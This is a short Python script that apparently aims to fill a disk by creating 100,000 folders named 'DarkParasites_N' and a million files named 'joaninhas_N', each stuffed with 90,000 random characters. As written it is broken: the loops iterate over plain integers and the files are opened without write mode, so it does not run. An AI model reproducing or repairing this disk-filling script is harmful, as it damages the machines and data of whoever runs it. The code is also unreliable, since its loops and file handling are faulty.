import os
import shutil
import random
import string
namepast = "DarkParasites"
numero_pastas = 100000
name_file = "joaninhas"
number_for_joaninhas = 1000000


for i in (numero_pastas):
    indice = f'{namepast}_{i}'
    os.mkdir(indice)
for i in (number_for_joaninhas):
      indices1 = f'{name_file}_{i}'
      with open(indices1) as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))

